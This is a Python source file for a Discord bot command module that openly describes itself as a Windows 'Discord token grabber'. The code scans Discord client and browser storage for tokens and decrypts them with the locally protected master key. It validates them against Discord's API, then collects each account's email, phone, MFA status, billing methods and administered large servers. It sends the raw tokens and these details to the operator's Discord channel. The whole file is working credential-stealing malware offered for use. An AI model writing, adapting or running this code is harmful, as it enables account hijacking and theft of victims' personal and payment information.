"""
commands/grabber.py - Discord token grabber (Windows only).
"""

import base64
import json
import os
import re

import requests
from discord import Embed
from discord.ext import commands

from config import IS_WINDOWS
from utils import in_correct_channel, is_authorized, log_message, wrong_channel

if IS_WINDOWS:
    from Crypto.Cipher import AES

    from config import CryptUnprotectData


class TokenExtractor:
    """Scans browser storage paths for Discord tokens."""

    BASE_URL = "https://discord.com/api/v9/users/@me"
    RE_PLAIN = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    RE_ENC = r"dQw4w9WgXcQ:[^\"]*"

    def __init__(self):
        self.appdata = os.getenv("localappdata", "")
        self.roaming = os.getenv("appdata", "")
        self.tokens: list[str] = []
        self.uids: list[str] = []
        self._extract()

    # ── Token extraction ───────────────────────────────────────────────────
    def _extract(self):
        paths = {
            "Discord": self.roaming + "\\discord\\Local Storage\\leveldb\\",
            "Discord Canary": self.roaming
            + "\\discordcanary\\Local Storage\\leveldb\\",
            "Lightcord": self.roaming + "\\Lightcord\\Local Storage\\leveldb\\",
            "Discord PTB": self.roaming + "\\discordptb\\Local Storage\\leveldb\\",
            "Opera": self.roaming
            + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
            "Opera GX": self.roaming
            + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
            "Amigo": self.appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
            "Torch": self.appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
            "Kometa": self.appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
            "Orbitum": self.appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
            "CentBrowser": self.appdata
            + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
            "7Star": self.appdata
            + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
            "Sputnik": self.appdata
            + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
            "Vivaldi": self.appdata
            + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
            "Chrome SxS": self.appdata
            + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
            "Chrome": self.appdata
            + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
            "Chrome Profile 1": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
            "Chrome Profile 2": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
            "Chrome Profile 3": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
            "Chrome Profile 4": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
            "Chrome Profile 5": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
            "Epic Privacy Browser": self.appdata
            + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
            "Microsoft Edge": self.appdata
            + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
            "Uran": self.appdata
            + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
            "Yandex": self.appdata
            + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
            "Brave": self.appdata
            + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
            "Iridium": self.appdata
            + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _app = name.replace(" ", "").lower()
            if "cord" in path:
                state_path = self.roaming + f"\\{_app}\\Local State"
                if not os.path.exists(state_path):
                    continue
                for fname in os.listdir(path):
                    if fname[-3:] not in ("log", "ldb"):
                        continue
                    for line in self._read_lines(f"{path}\\{fname}"):
                        for y in re.findall(self.RE_ENC, line):
                            token = self._decrypt(
                                base64.b64decode(y.split("dQw4w9WgXcQ:")[1]),
                                self._master_key(state_path),
                            )
                            self._add_if_valid(token)
            else:
                for fname in os.listdir(path):
                    if fname[-3:] not in ("log", "ldb"):
                        continue
                    for line in self._read_lines(f"{path}\\{fname}"):
                        for token in re.findall(self.RE_PLAIN, line):
                            self._add_if_valid(token)

        firefox = self.roaming + "\\Mozilla\\Firefox\\Profiles"
        if os.path.exists(firefox):
            for root, _, files in os.walk(firefox):
                for fname in files:
                    if not fname.endswith(".sqlite"):
                        continue
                    for line in self._read_lines(f"{root}\\{fname}"):
                        for token in re.findall(self.RE_PLAIN, line):
                            self._add_if_valid(token)

    @staticmethod
    def _read_lines(filepath: str) -> list[str]:
        try:
            return [l.strip() for l in open(filepath, errors="ignore") if l.strip()]
        except Exception:
            return []

    def _add_if_valid(self, token: str):
        if not token:
            return
        r = requests.get(self.BASE_URL, headers={"Authorization": token})
        if r.status_code != 200:
            return
        uid = r.json().get("id")
        if uid and uid not in self.uids:
            self.tokens.append(token)
            self.uids.append(uid)

    @staticmethod
    def _decrypt(buff: bytes, master_key: bytes) -> str:
        iv, payload = buff[3:15], buff[15:]
        decrypted = AES.new(master_key, AES.MODE_GCM, iv).decrypt(payload)
        return decrypted[:-16].decode()

    @staticmethod
    def _master_key(path: str):
        if not os.path.exists(path):
            return None
        content = open(path, "r", encoding="utf-8").read()
        if "os_crypt" not in content:
            return None
        state = json.loads(content)
        key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(key, None, None, None, 0)[1]


def _build_embeds(tokens: list[str]) -> list:
    results = []
    for token in tokens:
        try:
            u = requests.get(
                "https://discord.com/api/v8/users/@me", headers={"Authorization": token}
            )
            b = requests.get(
                "https://discord.com/api/v6/users/@me/billing/payment-sources",
                headers={"Authorization": token},
            )
            g = requests.get(
                "https://discord.com/api/v9/users/@me/guilds?with_counts=true",
                headers={"Authorization": token},
            )
            u.raise_for_status()
            b.raise_for_status()
            g.raise_for_status()

            ud = u.json()
            username = ud["username"] + "#" + ud["discriminator"]
            user_id = ud["id"]
            nitro = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}.get(
                ud.get("premium_type", 0), "None"
            )
            email = ud.get("email", "None")
            phone = ud.get("phone", "None")
            mfa = ud["mfa_enabled"]
            avatar = (
                f"https://cdn.discordapp.com/avatars/{user_id}/{ud['avatar']}.png"
                if ud.get("avatar")
                else None
            )

            billing = ", ".join(m["type"] for m in b.json()) if b.json() else "None"

            hq = [
                f"**{gd['name']} ({gd['id']})** | Members: `{gd['approximate_member_count']}`"
                for gd in g.json()
                if int(gd["permissions"]) & 0x8
                and gd["approximate_member_count"] >= 100
            ]

            embed = Embed(title=f"{username} ({user_id})", color=0x0084FF)
            embed.set_thumbnail(url=avatar)
            embed.add_field(name="📜 Token:", value=f"```{token}```", inline=False)
            embed.add_field(name="💎 Nitro:", value=nitro, inline=False)
            embed.add_field(name="💳 Billing:", value=billing, inline=False)
            embed.add_field(name="🔒 MFA:", value=mfa, inline=False)
            embed.add_field(name="📧 Email:", value=email, inline=False)
            embed.add_field(name="📳 Phone:", value=phone, inline=False)
            embed.add_field(
                name="🏰 HQ Guilds:",
                value="\n".join(hq) if hq else "None",
                inline=False,
            )
            results.append(embed)
        except Exception as err:
            print(f"Error processing token: {err}")
            results.append(f"An error occurred: {err}")
    return results


class GrabberCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="grab_discord")
    @commands.check(is_authorized)
    async def grab_discord(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        if not IS_WINDOWS:
            await log_message(
                ctx, "❌ Token grabbing is only supported on Windows.", duration=10
            )
            return

        loading = await ctx.send("🔄 Extracting Discord tokens...")
        try:
            import asyncio

            asyncio.create_task(self._run_grabber(ctx))
        except Exception as e:
            await log_message(ctx, f"Error whilst extracting tokens: {e}", duration=10)

    async def _run_grabber(self, ctx):
        tokens = TokenExtractor().tokens
        if not tokens:
            await ctx.send("No tokens found.")
            return
        for item in _build_embeds(tokens):
            if isinstance(item, str):
                await ctx.send(item)
            else:
                await ctx.send(embed=item)
        await ctx.send("✅ Tokens have been successfully extracted and sent!")


async def setup(bot):
    await bot.add_cog(GrabberCommands(bot))
